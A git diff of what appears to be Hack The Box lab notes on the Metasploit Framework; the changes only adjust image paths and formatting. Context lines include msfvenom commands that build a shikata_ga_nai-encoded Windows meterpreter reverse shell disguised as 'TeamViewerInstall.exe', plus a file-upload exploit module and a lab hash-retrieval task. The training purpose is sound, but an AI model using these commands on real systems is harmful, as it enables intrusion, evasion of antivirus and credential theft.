@@ -1,6 +1,6 @@
 # Using the Metasploit Framework
 
-<figure><img src="../../.gitbook/assets/image (15) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (276).png" alt=""><figcaption></figcaption></figure>
 
 ## Modules
 
@@ -356,7 +356,7 @@ buf += "\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e"
 <SNIP>
 ```
 
-### **Shikata Ga Nai Encoding**&#x20;
+### **Shikata Ga Nai Encoding**
 
 <figure><img src="https://cdn.services-k8s.prod.aws.htb.systems/content/modules/39/shikata_ga_nai.gif" alt=""><figcaption></figcaption></figure>
 
@@ -417,7 +417,7 @@ Compatible Encoders
 
 Take the above example just as that—a hypothetical example. If we were to encode an executable payload only once with SGN, it would most likely be detected by most antiviruses today. Let's delve into that for a moment. Picking up `msfvenom`, the subscript of the Framework that deals with payload generation and Encoding schemes, we have the following input:
 
-&#x20; Encoders
+Encoders
 
 ```shell-session
 eldeim@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
@@ -437,7 +437,7 @@ This will generate a payload with the `exe` format, called TeamViewerInstall.exe
 
 One better option would be to try running it through multiple iterations of the same Encoding scheme:
 
-&#x20; Encoders
+Encoders
 
 ```shell-session
 eldeim@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
@@ -1210,7 +1210,7 @@ Host script results:
 
 And we can observe the port 5000 http -->
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>
 
 > It has the creds admin:admin
 
@@ -1224,4 +1224,4 @@ windows/http/fortilogger_arbitrary_fileupload
 
 * Retrieve the NTLM password hash for the "htb-student" user. Submit the hash as the answer.
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>
